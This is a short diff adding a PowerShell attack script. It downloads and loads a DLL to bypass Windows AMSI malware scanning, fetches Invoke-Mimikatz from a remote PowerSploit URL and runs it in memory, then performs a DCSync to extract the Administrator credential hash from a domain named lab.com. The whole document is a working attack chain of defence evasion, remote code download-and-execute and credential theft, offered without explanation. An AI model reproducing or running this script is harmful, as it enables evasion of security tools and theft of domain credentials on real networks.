@@ -1,0 +1,6 @@
+$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/K1001011/Public/raw/main/amsi.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Amsi]::Bypass()
+
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator /domain:lab.com" "exit"'
